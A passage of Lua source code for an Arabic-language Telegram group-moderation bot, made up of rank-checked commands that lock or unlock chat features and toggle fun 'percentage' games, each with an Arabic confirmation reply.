database:del(bot_id.."lock:inline"..msg.chat_id_)  
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
database:del(bot_id.."lock:Video"..msg.chat_id_)  
database:del(bot_id.."lock:Link"..msg.chat_id_)  
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
database:del(bot_id.."lock:forward"..msg.chat_id_)  
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔 تم تفعيل جلب الصوره ،\n 𖥔 تم  فتح البوتات  ،\n 𖥔 تم  فتح التكرار ،\n 𖥔 تم  فتح الروابط ،\n 𖥔 تم  فتح التوجيه ،\n 𖥔 تم  فتح الملصقات ،\n 𖥔 تم  فتح المتحركه ،\n ?? تم  فتح الفيديو ،\n 𖥔 تم  فتح الفشار ،\n 𖥔 تم  فتح الانلاين ،\n 𖥔 تم  فتح تعديل المديا ،\n 𖥔 تم وضع التكرار  ،\n 𖥔 تم  فتح الفارسيه  ،\n 𖥔 تم وضع الايدي بصوره،n \n 𖥔 تم تفعيل الحمايه  بواسطه ، [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
if text == 'تفعيل الحمايه القصوه'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true)
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')
database:del(bot_id.."pp_photo:status"..msg.chat_id_) 
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'تم قفل الحمايه كامله\nتحظير هذا الحمايه تقفل كل حاجه بلتقييد\nتفعيل الحمايه دي بس عند التفليش او التحفيل\nلتعطيل الحمايه القصوه\nاكتب تعطيل الحمايه القوصه\n تم تفعيل الحمايه القصوه من قبل [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
if text == 'تعطيل الحمايه القصوه'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
database:del(bot_id.."lock:Join"..msg.chat_id_)  
database:del(bot_id.."lock:text"..msg.chat_id_)  
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
database:del(bot_id..'lock:edit'..msg.chat_id_)
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
database:del(bot_id.."lock:Video"..msg.chat_id_)  
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
database:del(bot_id.."lock:forward"..msg.chat_id_)  
database:del(bot_id.."lock:geam"..msg.chat_id_)  
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
database:set(bot_id.."pp_photo:status"..msg.chat_id_,true) 
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  تم تعطيل الحمايه القصوه من قبل    [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الدردشه ')
end,nil)   
elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔| تـم قفـل اضافة ')
end,nil)   
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل دخول ')
end,nil)   
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل البوتات ')
end,nil)   
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل البوتات بالطرد ')
end,nil)   
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الاشعارات ')
end,nil)   
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التثبيت ')
end,nil)   
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل تعديل ')
end,nil)   
elseif text == 'قفل السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل السب ')
end,nil)  
elseif text == 'قفل الازعاج' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Azag'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل السب ')
end,nil)  
elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الفارسيه ')
end,nil)   
elseif text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الانكليزيه ')
end,nil)
elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الانلاين ')
end,nil)
elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل تعديل ')
end,nil)    
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل جميع الاوامر ')
end,nil)   
end
if text == 'قفل الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الاباحي ')
end,nil)   
elseif text == 'فتح الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الاباحي ')
end,nil)   
end
if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الانلاين ')
end,nil)
elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح اضافة ')
end,nil)   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الدردشه ')
end,nil)   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح دخول ')
end,nil)   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح البوتات ')
end,nil)   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح البوتات بالطرد ')
end,nil)   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح الاشعارات ')
end,nil)   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح التثبيت ')
end,nil)   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح تعديل ')
end,nil)   
elseif text == 'فتح السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح السب ')
end,nil)   
elseif text == 'فتح الازعاج' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Azag'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح السب ')
end,nil)   
elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح الفارسيه ')
end,nil)   
elseif text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح الانكليزيه ')
end,nil)
elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح تعديل ')
end,nil)    
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فـتح جميع الاوامر ')
end,nil)   
end
if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الروابط ')
end,nil)   
elseif text == 'قفل الروابط بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الروابط بالتقييد ')
end,nil)   
elseif text == 'قفل الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الروابط بالكتم ')
end,nil)   
elseif text == 'قفل الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الروابط بالطرد ')
end,nil)   
elseif text == 'فتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الروابط ')
end,nil)   
end
if text == 'قفل المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المعرفات ')
end,nil)   
elseif text == 'قفل المعرفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المعرفات بالتقييد ')
end,nil)   
elseif text == 'قفل المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المعرفات بالكتم ')
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المعرفات بالطرد ')
end,nil)   
elseif text == 'فتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح المعرفات ')
end,nil)   
end
if text == 'تفعيل غنيلي' and CoSu(msg) then   
if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل غنيلي' and CoSu(msg) then  
if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل امر غنيلي'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل امر غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الحب' and Manager(msg) then   
if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل نسبه الحب'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الحب' and Manager(msg) then  
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل نسبه الحب'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الرجوله' and Manager(msg) then   
if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل نسبه الرجوله'
database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الرجوله' and Manager(msg) then  
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل نسبه الرجوله'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل نسبه الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الكره' and Manager(msg) then   
if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل نسبه الكره'
database:del(bot_id..'Cick:krh'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الكره' and Manager(msg) then  
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل نسبه الكره'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الانوثه' and Manager(msg) then   
if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
